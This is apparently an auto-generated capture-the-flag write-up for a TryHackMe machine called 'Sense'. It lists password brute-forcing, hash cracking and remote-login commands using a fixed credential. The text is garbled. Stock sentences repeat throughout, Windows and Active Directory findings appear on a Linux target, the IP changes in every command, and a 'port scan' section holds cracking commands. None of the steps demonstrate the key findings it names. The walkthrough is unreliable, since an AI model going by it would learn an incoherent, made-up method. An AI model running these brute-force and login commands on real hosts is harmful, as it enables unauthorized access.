---
TitleSEO: "TryHackMe — Sense (Hard Linux) | ZureFX"
TitlePost: "TryHackMe — Sense (Hard Linux)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe Sense. NFS No Root Squash and Silver Ticket to achieve hard compromise on Linux."
Keywords: "hackthebox, tryhackme, reversing, medium, forensics"
URL: "https://zurefx.github.io/writeups/htb-sense-811.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-sense-811/"
Date: "2024-07-06"
Tags: "HackTheBox, TryHackMe, Reversing, Medium, Forensics"
Section: "writeups"
Lang: "en"
main_img: "htb-sense-811"
Permalink: "/writeups/htb-sense-811.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Sense** is rated **Hard** on TryHackMe. It runs **Linux** and the IP address during this analysis was `10.53.186.48`.

### Objectives

Command injection was possible through unsanitized user input in the search functionality. Initial enumeration revealed several interesting open ports on the target.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
gobuster dir -u http://10.87.215.120/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The backup files contained sensitive information that should not have been accessible. Unconstrained delegation was enabled on the compromised machine.

### Service Enumeration

The database credentials were hardcoded in the application source code. The scheduled task ran with elevated privileges and could be abused for escalation. The database credentials were hardcoded in the application source code.

```bash
nmap -sCV -p389,25,389 10.62.92.119 -oN scan.txt
```

The application stored sensitive credentials in an unencrypted configuration file. Unconstrained delegation was enabled on the compromised machine.

### SMB Enumeration

Authentication bypass was achieved through careful manipulation of the login mechanism. Command injection was possible through unsanitized user input in the search functionality.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.128.64.56/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.66.160.217 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The web application was vulnerable to Server-Side Template Injection (SSTI). Network traffic analysis revealed unencrypted communications containing user credentials. Unconstrained delegation was enabled on the compromised machine.

## Exploitation

### Vulnerability Identification

Token impersonation allowed elevation to SYSTEM privileges on the target. The web application was vulnerable to Server-Side Template Injection (SSTI). The service account had excessive permissions assigned in Active Directory.

Key finding: **NFS No Root Squash**.

Command injection was possible through unsanitized user input in the search functionality. Unconstrained delegation was enabled on the compromised machine.

### Initial Access

Group Policy Preferences contained encrypted but recoverable credentials. The target system was identified as running a vulnerable version of the service.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.46.181.25 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
evil-winrm -i 10.51.229.23 -u administrator -p 'P@ssw0rd!'
```

The application stored sensitive credentials in an unencrypted configuration file. Group Policy Preferences contained encrypted but recoverable credentials. Post-exploitation enumeration revealed a path to domain administrator privileges.

## Privilege Escalation

### Enumeration

The application stored sensitive credentials in an unencrypted configuration file. The backup files contained sensitive information that should not have been accessible. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
crackmapexec smb 10.55.97.87 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Exploitation

The application stored sensitive credentials in an unencrypted configuration file. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
gobuster dir -u http://10.74.72.42/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
crackmapexec smb 10.12.233.82 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
```

Network traffic analysis revealed unencrypted communications containing user credentials. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Root/SYSTEM

Successfully obtained **root** access on the target.

Network traffic analysis revealed unencrypted communications containing user credentials. Network traffic analysis revealed unencrypted communications containing user credentials.

## Summary

### Tools Used

- `dcomexec`
- `hydra`
- `chisel`
- `enum4linux`
- `impacket`
- `lookupsid`
- `wmiexec`
- `pwncat`

### Key Takeaways

- NFS No Root Squash
- Silver Ticket
- GPP Password
- Local File Inclusion
